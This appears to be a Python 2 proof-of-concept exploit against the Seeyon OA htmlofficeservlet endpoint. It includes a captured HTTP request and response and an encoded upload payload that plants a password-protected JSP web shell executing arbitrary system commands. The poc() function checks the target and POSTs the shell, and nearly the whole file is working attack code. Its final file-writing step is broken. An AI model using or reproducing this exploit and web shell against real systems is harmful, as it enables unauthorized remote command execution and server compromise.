# -*- coding:utf-8 -*-

import requests
import Queue
import sys


queue = Queue.Queue()
host = sys.argv[1]


'''
POST /seeyon/htmlofficeservlet HTTP/1.1
Content-Length: 1121
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Host: xxxxxxxxx
Pragma: no-cache

DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!p
ublic static String excuteCmd(String c) {StringBuilder line = new StringBuilder();
try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedR
eader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp
 = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exceptio
n e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equ
als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.pri
ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(
":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce

响应
DBSTEP V3.0 386 0 666 DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
CLIENTIP=wLCXqUKAP7uhw4g5zi=6
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!p
ublic static String excuteCmd(String c) {StringBuilder line = new StringBuilder();
try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedR
eader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp
 = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exceptio
n e) {line.append(e.getMessage());}return line.toString();} %><%if("asasd3344".equ
als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.pri
ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(
":-)");}%>

/seeyou/test123456.jsp?pwd=1&cmd=2

'''

payload = '''
DBSTEP V3.0 355 0 666 DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!p
ublic static String excuteCmd(String c) {StringBuilder line = new StringBuilder();
try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedR
eader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp
 = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exceptio
n e) {line.append(e.getMessage());}return line.toString();} %><%if("xtest".equ
als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.pri
ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(
":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
'''
#/seeyou/test123456.jsp?pwd=xtest&cmd=2


HEADERS = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
    'Pragma':'no-cache'
}



def poc():
    
    
    url = host + '/seeyon/htmlofficeservlet'
    p1 = requests.get(url=url,headers=HEADERS,verify=False,timeout=12)
    if(('DBSTEP' in p1.text and 'htmoffice' in p1.text) or ('DBSTEP' in p1.content and 'htmoffice' in p1.content)):
        print 'vulerable'
    p2 = requests.post(url=url,headers=HEADERS,data=payload)
    if(('DBSTEP' in p2.text and 'currentUserId' in p2.text) or ('DBSTEP' in p2.content and 'currentUserId' in p2.content)):
        with open('success.txt') as f:
            f.write()
        
    
if __name__=='__main__':
    poc()
    
